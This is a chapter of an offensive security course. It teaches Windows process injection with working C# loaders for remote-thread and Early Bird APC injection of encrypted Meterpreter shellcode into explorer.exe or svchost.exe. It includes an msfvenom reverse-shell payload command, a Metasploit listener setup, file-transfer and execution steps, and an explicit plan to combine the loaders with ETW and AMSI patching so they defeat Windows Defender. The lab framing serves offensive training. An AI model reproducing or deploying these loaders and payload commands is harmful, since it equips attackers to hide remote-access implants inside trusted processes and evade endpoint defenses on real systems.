# Document 09: Process Injection - Running Code Inside Legitimate Processes

## Where We Are

You finished Documents 05 through 08. You have built five loaders so far:

- **Loader 01** (Document 05): Raw shellcode loaded via DllImport. Caught by Defender.
- **Loader 02** (Document 06): XOR-encrypted shellcode. The encrypted file survived disk scanning, but the loader binary was still caught.
- **Loader 03** (Document 07): Dynamic resolution, NT-level functions, two-step allocation, XOR encryption. First loader to survive Defender. You got a callback.
- **Loader 04** (Document 08): AMSI bypass. Patches AmsiScanBuffer so .NET code and PowerShell commands are not scanned.
- **Loader 07** (Document 08): ETW patch. Patches EtwEventWrite so your process stops generating telemetry that Defender reads.

Your C# knowledge at this point:

- DllImport and P/Invoke for calling Windows API functions
- VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread for memory operations
- Delegates for calling functions through memory addresses
- GetModuleHandle, GetProcAddress, LoadLibrary for dynamic function resolution
- Building strings and bytes from arithmetic to avoid static signatures
- XOR encryption and decryption
- Patching system functions (AmsiScanBuffer, NtTraceEvent) by overwriting their first byte

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

Every loader you have built so far runs shellcode inside its own process. When you run syscall_loader.exe on the target, Defender sees a new process called syscall_loader.exe that allocates memory, creates a thread, and makes a network connection. Even though Loader 03 survives Defender at default sensitivity, the process name itself is suspicious. Your binary is an unknown executable that appeared from nowhere and is now making outbound connections. If a security analyst looks at running processes, syscall_loader.exe stands out because it is not a program anyone recognizes.

Process injection solves this problem. Instead of running shellcode in your own process, you inject it into a process that is already running and that everyone expects to see. If your shellcode runs inside explorer.exe (the Windows desktop process) or svchost.exe (a system service host), it inherits that process's name, its process tree, and its network permissions. A security analyst looking at running processes sees explorer.exe making a network connection, which is normal behavior for explorer.exe. Your shellcode is invisible inside a legitimate process.

This document teaches two process injection techniques:

1. **Loader 05 (Remote Thread Injection):** Find an already-running process, allocate memory inside it, write your shellcode there, and create a thread in that process to execute it. This is the most straightforward form of process injection.

2. **Loader 06 (Early Bird APC Injection):** Create a new legitimate process in a suspended state (paused before it starts running), write your shellcode into its memory, queue the shellcode to execute before the process's own code, and resume the process. Your shellcode runs first, before the legitimate program even starts.

**Important:** Both of these loaders are caught by Defender when used alone. Defender specifically monitors for the API patterns these loaders use (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread, and CreateProcess suspended + VirtualAllocEx + QueueUserAPC + ResumeThread). Defender has behavioral rules for these patterns because they are well-known injection techniques.

These loaders become useful when combined with the ETW and AMSI patches from Document 08. If you patch ETW before injecting, Defender does not receive the telemetry about the injection. If you combine injection with dynamic resolution (Loader 03's technique), the import table is clean. Document 10 puts everything together into a single loader that patches ETW, patches AMSI, and then performs injection, all of which together survives Defender.

For this document, you will run each loader standalone to learn how process injection works. Expect Defender to catch them. The goal is to understand the technique so you can use it effectively in Document 10.

## How This Works

### What is a Process?

A process is a running program. When you double-click notepad.exe, Windows creates a process for Notepad. That process gets its own block of memory (called a virtual address space), its own set of handles (connections to files, network sockets, devices), and one or more threads that execute code.

Every process on Windows has a Process ID (PID), which is a number that uniquely identifies it while it is running. You can see all running processes in Task Manager. Each process runs independently and normally cannot access another process's memory.

The key word is "normally". Windows provides API functions that let one process read and write another process's memory, create threads inside another process, and allocate memory inside another process. These APIs exist for legitimate reasons (debuggers, profilers, accessibility tools), but they are also what makes process injection possible.

### Remote Thread Injection (Loader 05)

Remote thread injection is the most basic form of process injection. The steps are:

1. **Find the target process.** Pick a process that is already running and that you want to inject into. Good choices are processes that normally make network connections (explorer.exe, svchost.exe) because your shellcode will make a reverse connection to Kali.

2. **Open the target process.** Use OpenProcess with PROCESS_ALL_ACCESS to get a handle that lets you do anything to the process (read memory, write memory, create threads).

3. **Allocate memory inside the target process.** Use VirtualAllocEx (the "Ex" stands for extended, meaning it works on another process instead of your own process). This creates a block of memory inside the target process that you can write to.

4. **Write your shellcode into that memory.** Use WriteProcessMemory to copy your shellcode bytes from your process into the memory block you just allocated inside the target process.

5. **Change the memory protection.** Use VirtualProtectEx to change the memory from writable (PAGE_READWRITE) to executable (PAGE_EXECUTE_READ). This is the two-step allocation from Loader 03, but applied to another process.

6. **Create a remote thread.** Use CreateRemoteThread to create a new thread inside the target process. The thread starts executing at the address where you wrote your shellcode. From the target process's perspective, it now has an extra thread that is running code from its own memory.

After the injection, your shellcode is running inside the target process. If you injected into explorer.exe, the Meterpreter connection comes from explorer.exe's PID. Task Manager shows explorer.exe as the process using the network.

### Early Bird APC Injection (Loader 06)

Remote thread injection works well, but it has a limitation: the target process is already running and might already have security monitoring hooks loaded inside it. Some EDR products inject their own monitoring DLLs into every running process. By the time you inject your shellcode into explorer.exe, the EDR's monitoring code is already there watching what happens.

Early Bird injection solves this by getting your code to run before any monitoring hooks are set up. Instead of injecting into a process that is already running, you create a brand new process but tell Windows to pause it immediately (before it runs any code). Then you write your shellcode into the paused process's memory and tell Windows "when this process resumes, run my code first." When you unpause the process, your shellcode runs at the very beginning of the process's life, before any security product has a chance to inject its monitoring hooks. Your code runs in a clean process with no watchers.

This works because of a Windows feature called APC, which stands for Asynchronous Procedure Call. APC lets you queue a function to run on a specific thread. When a thread is created in a suspended state (paused), it is in what Windows calls an "alertable" state by default. When a suspended thread resumes, Windows checks if any APCs have been queued on it and runs them first. So if you queue your shellcode as an APC on the paused thread and then resume the thread, your shellcode executes before the process's own code starts.

The steps are:

1. **Create a process in suspended state.** Use CreateProcess with the CREATE_SUSPENDED flag. Windows creates the process, sets up its memory space, and loads the executable image, but the main thread is paused. No code has run yet.

2. **Allocate memory inside the suspended process.** Use VirtualAllocEx to create a memory block for your shellcode.

3. **Write your shellcode into that memory.** Use WriteProcessMemory to copy the shellcode bytes.

4. **Change the memory protection.** Use VirtualProtectEx to make the memory executable.

5. **Queue the APC.** Use QueueUserAPC to add your shellcode's address as an APC on the suspended thread. This tells Windows: "the next time this thread resumes and checks for APCs, run the function at this address".

6. **Resume the thread.** Use ResumeThread to unpause the main thread. Windows processes the queued APCs first. Your shellcode runs. After your shellcode finishes (or if it is a long-running payload like Meterpreter, it keeps running), the thread continues with the legitimate program's initialization.

The "Early Bird" name comes from the fact that your code runs at the very beginning of the process's life, before any security products have a chance to inject their monitoring hooks into the process. Some EDR products inject their monitoring DLLs during process initialization. If your code runs before that initialization completes, the EDR hooks are not in place yet and cannot see your shellcode execute.

### Why These Get Caught by Defender Alone

Defender has specific behavioral rules for both of these patterns:

**Remote Thread Injection detection:**
Defender watches for the sequence OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread. When your loader calls these functions, Defender's API hooks in ntdll.dll intercept each call. The hooks record the parameters: which process was opened, how much memory was allocated, what was written, and where the new thread starts. When Defender sees this complete sequence targeting another process, it scores the behavior as malicious and blocks the thread creation or terminates the injecting process.

**Early Bird APC detection:**
Defender watches for the sequence CreateProcess(SUSPENDED) + VirtualAllocEx + WriteProcessMemory + QueueUserAPC + ResumeThread. This is a known attack pattern that Defender's behavioral engine specifically targets. The CREATE_SUSPENDED flag on its own is not suspicious (legitimate programs use it), but combined with memory allocation, writing, and APC queuing, the pattern matches Defender's rules.

When these loaders are combined with ETW patching (Loader 07), the telemetry that feeds Defender's behavioral engine is disabled. Without ETW events, Defender does not see the API call sequence, and the injection succeeds.

## What Defender Does

| Layer | What it does | Loader 05 alone | Loader 06 alone |
|---|---|---|---|
| Static file scanning | Scans the binary on disk | Binary survives (no suspicious strings if shellcode is encrypted) | Binary survives |
| Import table analysis | Reads function names from PE header | **CAUGHT**: imports OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | **CAUGHT**: imports CreateProcess, VirtualAllocEx, WriteProcessMemory, QueueUserAPC |
| AMSI | Scans .NET code at runtime | Not triggered (shellcode is in unmanaged memory) | Not triggered |
| API hooks in ntdll.dll | Intercepts API calls | **CAUGHT**: hooks see the injection call sequence | **CAUGHT**: hooks see the injection call sequence |
| ETW telemetry | Logs process behavior | **CAUGHT**: ETW events log the injection pattern | **CAUGHT**: ETW events log the injection pattern |
| Behavioral ML | Scores process behavior | **CAUGHT**: injection pattern is a high-confidence detection | **CAUGHT**: injection pattern is a high-confidence detection |

Both loaders are caught by multiple layers when used alone. The import table reveals their intent (they import functions that only injection tools use). The API hooks intercept the actual injection calls. The ETW events log the entire sequence for behavioral analysis. The ML model scores the combined behavior as malicious.

This is why these loaders are not standalone evasion tools. They are injection mechanisms that need to be combined with the evasion techniques from Documents 07 and 08 (dynamic resolution, ETW patching, AMSI patching) to work against Defender.

## The Evasion Technique

The core evasion these loaders provide is not about bypassing Defender on their own. It is about changing where your shellcode runs.

Without process injection, your shellcode runs in a custom process (syscall_loader.exe, or whatever you name your binary). That process stands out because:
- It is an unknown binary that no one on the system recognizes
- It appeared recently (not installed with the OS or any known software)
- It is making network connections to an external IP address
- It has a suspicious memory layout (executable memory that was not part of the original binary)

With process injection, your shellcode runs inside a process that legitimately belongs on the system:
- explorer.exe is the Windows desktop shell. It is always running.
- svchost.exe is the service host. Multiple instances always run.
- RuntimeBroker.exe manages Windows app permissions. It is always running.

When your shellcode runs inside explorer.exe, a security analyst checking network connections sees explorer.exe connecting to an external IP. That is more normal than some random unknown binary doing the same thing. The process tree (which process started which) also looks clean because explorer.exe was already running before you injected.

The injection technique itself (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) is well-known and heavily detected. The evasion comes from combining it with other techniques that hide the injection from Defender's monitoring.

## Getting the Loader Onto the Target

### What You Need

For both loaders, you need:
1. The compiled loader binary (.exe)
2. An encrypted shellcode file (encrypted.bin from Document 06)
3. The XOR key from the encryption

### Transfer Workflow

1. **Kali (192.168.10.200):** If you need fresh shellcode, generate it with msfvenom. If you still have encrypted.bin from Document 06, skip this step.

2. **Dev box (ammulu, 192.168.10.150):** Compile both loaders. If you need to regenerate encrypted.bin, run the XOR encoder from Document 06 on fresh shellcode. Host all files on Python HTTP server.

3. **Target (kimjongun, 192.168.10.100):** Download the files from the dev box and run them.

Compile on the dev box (ammulu). First create a project for Loader 05:
```
dotnet new console -n Loader05
```
Replace `Loader05\Program.cs` with the code from `05_reflective_injector.cs`, then publish:
```
dotnet publish Loader05 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output05/
```
The binary is at `output05\Loader05.exe`.

Create a second project for Loader 06:
```
dotnet new console -n Loader06
```
Replace `Loader06\Program.cs` with the code from `06_process_hollowing_alt.cs`, then publish:
```
dotnet publish Loader06 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output06/
```
The binary is at `output06\Loader06.exe`.

Host on the dev box (ammulu):
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

Download on the target (kimjongun):
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/reflective_inject.exe" -OutFile "C:\Users\kimjongun\Desktop\reflective_inject.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/earlybird.exe" -OutFile "C:\Users\kimjongun\Desktop\earlybird.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

Defender scans the files on disk when they are written. The .exe binaries may or may not trigger static detection depending on Defender's current signatures. The import table contains suspicious function names (WriteProcessMemory, CreateRemoteThread), which some Defender versions flag statically. The encrypted.bin file survives because XOR encryption scrambles the byte patterns.

**Expect Defender to catch these loaders when you run them.** The goal of this document is to teach the injection technique, not to bypass Defender. Document 10 combines injection with all the evasion techniques for a full bypass.

**Reference files:** `lab/loaders/05_reflective_injector.cs` and `lab/loaders/06_process_hollowing_alt.cs`

## Teaching the Code

### Part 1: Loader 05 - Remote Thread Injection

#### Windows API Imports

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr OpenProcess(
    uint dwDesiredAccess,
    bool bInheritHandle,
    int dwProcessId
);
```

OpenProcess gives you a handle to another process. A handle is a number that represents a connection to a system resource (in this case, a process). The `dwDesiredAccess` parameter specifies what you want to do with the process. PROCESS_ALL_ACCESS (0x001FFFFF) gives full permissions: read memory, write memory, create threads, and everything else. The `dwProcessId` is the PID (Process ID) of the process you want to open.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr VirtualAllocEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```

VirtualAllocEx is VirtualAlloc but for another process. The first parameter is the process handle (from OpenProcess). The rest are the same as VirtualAlloc from Document 04: the address to allocate at (IntPtr.Zero means let Windows choose), the size, the allocation type (MEM_COMMIT | MEM_RESERVE), and the memory protection (PAGE_READWRITE for the first step of two-step allocation).

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    uint nSize,
    out UIntPtr lpNumberOfBytesWritten
);
```

WriteProcessMemory copies bytes from your process into another process. The `hProcess` is the target process handle. `lpBaseAddress` is the address in the target process where you want to write (the address returned by VirtualAllocEx). `lpBuffer` is the byte array containing your shellcode. `nSize` is how many bytes to write. `lpNumberOfBytesWritten` receives the actual number of bytes that were written.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr CreateRemoteThread(
    IntPtr hProcess,
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId
);
```

CreateRemoteThread creates a new thread inside another process. The critical parameter is `lpStartAddress`: the address in the target process where the thread starts executing. This is the address where you wrote your shellcode using WriteProcessMemory. When CreateRemoteThread runs, a new thread starts in the target process, and that thread begins executing your shellcode.

The other parameters are mostly defaults: `lpThreadAttributes` is IntPtr.Zero (default security), `dwStackSize` is 0 (default stack size), `lpParameter` is IntPtr.Zero (no parameter), `dwCreationFlags` is 0 (start immediately), and `lpThreadId` is IntPtr.Zero (we do not need the thread ID).

All five of these DllImport lines have a cost. When the C# compiler processes each one, it writes the function name directly into the .exe file on your hard drive in a section called the import table. You can open the compiled .exe in Notepad right now and you will literally see "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", and "VirtualProtectEx" sitting there as readable text inside all the garbage characters. Defender opens that .exe, reads the whole thing from start to end, and when it finds that cluster of cross-process memory and thread functions together in the import table, it recognizes it immediately as a process injection tool. This is why Loader 05 gets caught before it can do anything useful.

#### Finding the Target Process

```csharp
string targetProcessName = args[0];
string shellcodePath = args[1];
string xorKeyHex = args.Length >= 3 ? args[2] : null;

Process[] processes = Process.GetProcessesByName(targetProcessName);
if (processes.Length == 0)
{
    Console.WriteLine("[-] No process found with name: " + targetProcessName);
    return;
}

Process targetProcess = processes[0];
int targetPid = targetProcess.Id;
Console.WriteLine("[+] Found target process: " + targetProcessName + " (PID: " + targetPid + ")");
```

The first command-line argument is the name of the process you want to inject into (without the .exe extension). Process.GetProcessesByName searches all running processes for ones with that name. If multiple processes match (for example, there are usually several svchost.exe instances), we use the first one. The `Id` property gives us the PID, which we need for OpenProcess.

#### Reading and Decrypting Shellcode

```csharp
byte[] shellcode = File.ReadAllBytes(shellcodePath);
Console.WriteLine("[*] Read " + shellcode.Length + " bytes from file.");

if (xorKeyHex != null)
{
    byte[] xorKey = HexToBytes(xorKeyHex);
    shellcode = TransformData(shellcode, xorKey);
    Console.WriteLine("[+] Data decrypted.");
}
```

This is the same pattern from Loader 02 and Loader 03. Read the encrypted shellcode file, and if a XOR key was provided, decrypt it. The TransformData function XOR-decrypts the data using the multi-byte key.

#### The Injection Sequence

```csharp
IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
if (processHandle == IntPtr.Zero)
{
    Console.WriteLine("[-] Failed to open target. Do you have admin privileges?");
    return;
}
Console.WriteLine("[+] Opened target handle: 0x" + processHandle.ToString("X"));
```

Open the target process with full access. If this fails, the most common reason is insufficient privileges. To inject into system processes like svchost.exe, you need to run the loader as Administrator. If you inject into a user-level process like explorer.exe, you may not need admin privileges (it depends on the process's security settings).

```csharp
IntPtr remoteMemory = VirtualAllocEx(
    processHandle,
    IntPtr.Zero,
    (uint)shellcode.Length,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

Allocate memory inside the target process. This creates a block of memory that belongs to the target process, not to your loader process. The memory is writable but not executable (PAGE_READWRITE), following the two-step allocation pattern.

```csharp
UIntPtr bytesWritten;
bool writeResult = WriteProcessMemory(
    processHandle,
    remoteMemory,
    shellcode,
    (uint)shellcode.Length,
    out bytesWritten
);

int shellcodeLength = shellcode.Length;
Array.Clear(shellcode, 0, shellcode.Length);
```

Copy the shellcode from your loader's memory into the target process's memory. After copying, clear the shellcode from your own process with Array.Clear so it does not remain in your process's managed memory. The shellcode now exists only in the target process.

```csharp
uint oldProtect;
VirtualProtectEx(
    processHandle,
    remoteMemory,
    (UIntPtr)shellcodeLength,
    PAGE_EXECUTE_READ,
    out oldProtect
);
```

Change the remote memory protection from writable to executable (PAGE_EXECUTE_READ). This is step 2 of two-step allocation, applied to the target process.

```csharp
IntPtr threadHandle = CreateRemoteThread(
    processHandle,
    IntPtr.Zero,
    0,
    remoteMemory,
    IntPtr.Zero,
    0,
    IntPtr.Zero
);
```

Create a new thread inside the target process that starts executing at remoteMemory (where your shellcode is). After this call, the shellcode is running inside the target process. Your Meterpreter session (if the shellcode is a reverse shell) will appear to come from the target process.

```csharp
WaitForSingleObject(threadHandle, 0xFFFFFFFF);
CloseHandle(threadHandle);
CloseHandle(processHandle);
```

Wait for the remote thread to finish, then close the handles. The 0xFFFFFFFF timeout means wait forever, which keeps your loader process alive while the Meterpreter session is active.

### The Complete Remote Thread Injection Loader

The full source code is at `lab/loaders/05_reflective_injector.cs`.

---

### Part 2: Loader 06 - Early Bird APC Injection

#### Structures

```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO
{
    public int cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public int dwX, dwY, dwXSize, dwYSize;
    public int dwXCountChars, dwYCountChars;
    public int dwFillAttribute;
    public int dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput, hStdOutput, hStdError;
}
```

STARTUPINFO is a Windows structure that tells CreateProcess how the new process's window should look. It has many fields, but for our purposes, we set them all to their default values (zeros). The only field we set is `cb` (the structure's size in bytes), which CreateProcess requires.

The `[StructLayout(LayoutKind.Sequential)]` attribute tells C# to place the structure's fields in memory in exactly the order they are declared, field by field, one after another. This matters because Windows looks at specific byte offsets to find specific values. For example, Windows knows that the process ID is at byte offset 8 inside PROCESS_INFORMATION. If C# decided to reorder or rearrange the fields to make memory access faster (which it sometimes does automatically), the bytes would be at different positions and Windows would read garbage values.

By default C# can rearrange struct fields for alignment reasons. Alignment is about placing data at memory addresses that are multiples of the data size, because CPUs read aligned data faster. A 4-byte integer loads fastest when it starts at an address divisible by 4. C# might insert padding bytes between fields or reorder them to achieve this. `LayoutKind.Sequential` turns off that optimization and says "the layout I wrote is the layout I need."

```csharp
[StructLayout(LayoutKind.Sequential)]
struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}
```

PROCESS_INFORMATION receives information about the newly created process. After CreateProcess runs, this structure contains the process handle (`hProcess`), the main thread handle (`hThread`), the process ID (`dwProcessId`), and the main thread ID (`dwThreadId`). We need `hProcess` for VirtualAllocEx and WriteProcessMemory, and `hThread` for QueueUserAPC and ResumeThread.

#### Windows API Imports

```csharp
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
static extern bool CreateProcess(
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref STARTUPINFO lpStartupInfo,
    out PROCESS_INFORMATION lpProcessInformation
);
```

CreateProcess starts a new process. The key parameters are `lpApplicationName` (the path to the executable, like C:\Windows\System32\svchost.exe) and `dwCreationFlags` (where we pass CREATE_SUSPENDED = 0x4 to create the process in a paused state). The other parameters are mostly defaults (IntPtr.Zero or null).

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern uint QueueUserAPC(
    IntPtr pfnAPC,
    IntPtr hThread,
    IntPtr dwData
);
```

QueueUserAPC is the function that makes Early Bird injection possible. It takes three parameters:
- `pfnAPC`: the address of the function to run. We pass the address where we wrote our shellcode in the target process.
- `hThread`: the thread to queue the APC on. We pass the main thread of the suspended process.
- `dwData`: a parameter to pass to the APC function. We pass IntPtr.Zero because our shellcode does not need a parameter.

When the thread resumes and processes its APC queue, it calls the function at `pfnAPC` (our shellcode).

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern uint ResumeThread(IntPtr hThread);
```

ResumeThread unpauses a suspended thread. After calling this, the thread starts running. Because we queued an APC, the thread processes the APC first (running our shellcode) before continuing with the process's own initialization code.

Loader 06's imports are CreateProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, QueueUserAPC, ResumeThread, and CloseHandle. Every one of those names gets written directly into the .exe file on your hard drive when the C# compiler processes the DllImport lines. Defender opens that .exe, reads the whole thing from start to end, and the combination of cross-process memory operations with QueueUserAPC is a well-known APC injection pattern in its database. This is again why Loader 06 gets caught before it runs when used alone.

#### Creating the Suspended Process

```csharp
string targetExePath = args[0];
string shellcodePath = args[1];
string xorKeyHex = args.Length >= 3 ? args[2] : null;
```

The first argument is the full path to a legitimate Windows executable (like C:\Windows\System32\svchost.exe). The second is the shellcode file. The optional third is the XOR key.

```csharp
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
PROCESS_INFORMATION pi;

bool created = CreateProcess(
    targetExePath,
    null,
    IntPtr.Zero,
    IntPtr.Zero,
    false,
    CREATE_SUSPENDED,
    IntPtr.Zero,
    null,
    ref si,
    out pi
);
```

This creates a new process from the executable at `targetExePath`, but with the CREATE_SUSPENDED flag. The process is loaded into memory, but its main thread is paused. No code from the legitimate executable has run yet. After this call, `pi.hProcess` is the process handle, `pi.hThread` is the main thread handle, and `pi.dwProcessId` is the PID.

The `Marshal.SizeOf(si)` sets the `cb` field to the correct size of the STARTUPINFO structure. Windows checks this field to verify that the caller is using the right version of the structure.

#### Allocating and Writing

```csharp
IntPtr remoteMemory = VirtualAllocEx(
    pi.hProcess,
    IntPtr.Zero,
    (uint)shellcode.Length,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

Allocate memory in the suspended process. This is the same VirtualAllocEx call from Loader 05, but using `pi.hProcess` (the suspended process's handle) instead of a handle from OpenProcess.

```csharp
UIntPtr bytesWritten;
bool written = WriteProcessMemory(
    pi.hProcess,
    remoteMemory,
    shellcode,
    (uint)shellcode.Length,
    out bytesWritten
);

int shellcodeLength = shellcode.Length;
Array.Clear(shellcode, 0, shellcode.Length);
```

Write the shellcode into the suspended process and clear it from the loader's memory. Same pattern as Loader 05.

```csharp
uint oldProtect;
VirtualProtectEx(pi.hProcess, remoteMemory, (UIntPtr)shellcodeLength, PAGE_EXECUTE_READ, out oldProtect);
```

Change the memory to executable. Two-step allocation, same as before.

#### Queuing and Resuming

```csharp
uint apcResult = QueueUserAPC(remoteMemory, pi.hThread, IntPtr.Zero);

if (apcResult == 0)
{
    Console.WriteLine("[-] APC queue operation failed.");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return;
}
Console.WriteLine("[+] APC queued on main thread");
```

This is the critical step that differentiates Early Bird injection from Remote Thread injection. Instead of creating a new thread (CreateRemoteThread), we queue our shellcode as an APC on the process's existing main thread. The address `remoteMemory` (where our shellcode is) is set as the APC function. When the thread resumes, it will call the function at this address.

```csharp
ResumeThread(pi.hThread);
Console.WriteLine("[+] Thread resumed. Code is executing inside " + targetExePath);
```

Resume the suspended thread. The thread processes its APC queue, finds our entry, and calls the function at `remoteMemory`. Our shellcode runs. Because the process was just created and is running a legitimate executable, it blends into the list of normal system processes.

```csharp
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
```

Close the handles. The shellcode is running in the target process independently. Your loader process can exit, and the shellcode keeps running inside the legitimate process.

### The Complete Early Bird APC Injection Loader

The full source code is at `lab/loaders/06_process_hollowing_alt.cs`.

## Compilation and Execution

### Step 1: Generate and Encrypt Shellcode (If Needed)

If you still have encrypted.bin on the dev box from Document 06, skip to Step 2.

On Kali (192.168.10.200):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
```

Transfer to the dev box (ammulu) and encrypt with the XOR encoder from Document 06:
```
xor_encode.exe payload.bin encrypted.bin
```

Save the printed XOR key.

### Step 2: Compile Both Loaders on the Dev Box

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:

```
csc /unsafe /out:reflective_inject.exe 05_reflective_injector.cs
csc /unsafe /out:earlybird.exe 06_process_hollowing_alt.cs
```

Expected output: both compile with no errors.

### Step 3: Transfer Files to the Target

On the dev box (ammulu):
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100):
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/reflective_inject.exe" -OutFile "C:\Users\kimjongun\Desktop\reflective_inject.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/earlybird.exe" -OutFile "C:\Users\kimjongun\Desktop\earlybird.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

### Step 4: Set Up Your Listener on Kali

On Kali (192.168.10.200):
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

### Step 5: Run Loader 05 (Remote Thread Injection)

On the target (kimjongun, 192.168.10.100), open an **Administrator Command Prompt** (right-click cmd.exe, Run as administrator) because injecting into system processes requires admin privileges:

```
cd C:\Users\kimjongun\Desktop
reflective_inject.exe explorer encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with your actual XOR key.

**Expected behavior:** Defender will likely catch this loader. You may see one of these outcomes:

1. Defender quarantines reflective_inject.exe before you can run it (static detection of the import table).
2. Defender blocks the injection at runtime and shows a threat notification (behavioral detection of the injection pattern).
3. Defender terminates your command prompt session after the injection attempt.

If Defender catches it, open Windows Security on the target, go to Virus & threat protection, then Protection history. You will see an entry describing the detection. Note the detection name (it will be something like "Behavior:Win32/Injector" or "Trojan:Win32/Meterpreter").

This is expected. Loader 05 is not designed to bypass Defender on its own. It teaches the injection mechanism that you will use in Document 10 with proper evasion.

### Step 6: Run Loader 06 (Early Bird APC Injection)

On the target (kimjongun, 192.168.10.100), in an Administrator Command Prompt:

```
cd C:\Users\kimjongun\Desktop
earlybird.exe C:\Windows\System32\svchost.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with your actual XOR key.

**Expected behavior:** Same as Loader 05. Defender will likely catch this. The CREATE_SUSPENDED + VirtualAllocEx + QueueUserAPC + ResumeThread pattern is a known detection rule. Check Protection history to see the detection name.

If by chance Defender does not catch either loader (which can happen if a specific signature update has not been pushed yet), check your Kali listener for a Meterpreter session. If you get a session, run `sysinfo` and note that the session's process name is the target process (explorer.exe or svchost.exe), not your loader binary.

## Confirming Success

Because Defender is expected to catch these loaders, success in this document means understanding how the injection works, not getting a callback.

### What You Should Confirm:

1. **Both loaders compiled without errors** on the dev box (ammulu). This confirms the code is syntactically correct and the API imports are valid.

2. **You understand why Defender caught them.** Check Protection history on the target (kimjongun) and note the detection names. The names tell you which detection layer triggered:
   - "Behavior:Win32/..." means behavioral detection (the API call sequence was caught)
   - "Trojan:Win32/..." means the binary itself was flagged (import table or static analysis)
   - "VirTool:Win32/..." means Defender classified it as a hacking tool

3. **You understand the difference between the two techniques:**
   - Loader 05 injects into an already-running process
   - Loader 06 creates a new process and injects before it starts

4. **You understand why admin privileges are needed.** Injecting into another process requires the SeDebugPrivilege, which is only available to administrator-level accounts.

### If You Want to See the Injection Work (Without Defender)

If you want to see the full injection flow without Defender blocking it, you can temporarily test on the dev box (ammulu) where Defender is disabled. Generate shellcode pointing to Kali, compile and run the loader on the dev box. You will see the injection succeed and get a Meterpreter session from the dev box (not the target). This confirms the code works correctly. Remember to set up your Kali listener first.

This is strictly for learning. The dev box is not your target. The point is to verify the injection mechanism works before combining it with evasion in Document 10.

## What Was Gained

After this document, you can:

- Open another process's memory using OpenProcess with PROCESS_ALL_ACCESS
- Allocate memory inside another process using VirtualAllocEx
- Write data to another process's memory using WriteProcessMemory
- Create a thread in another process using CreateRemoteThread
- Create a process in a suspended state using CreateProcess with CREATE_SUSPENDED
- Queue code execution on a thread using QueueUserAPC
- Resume a suspended thread using ResumeThread
- Explain why process injection makes your shellcode harder to detect (it runs under a legitimate process name)
- Explain why these techniques are caught by Defender alone (the API call sequence is a known detection pattern)
- Explain why combining injection with ETW patching and dynamic resolution defeats Defender

You now understand all six building blocks that go into the combined evasion loader (Document 10):

| Building block | What it does | Loader |
|---|---|---|
| XOR encryption | Defeats disk scanning | Loader 02 |
| Dynamic resolution | Defeats import table analysis | Loader 03 |
| NT-level functions | Reduces behavioral ML score | Loader 03 |
| Two-step allocation | Avoids suspicious RWX memory | Loader 03 |
| ETW patching | Disables telemetry to Defender | Loader 07 |
| AMSI patching | Disables runtime code scanning | Loader 04 |
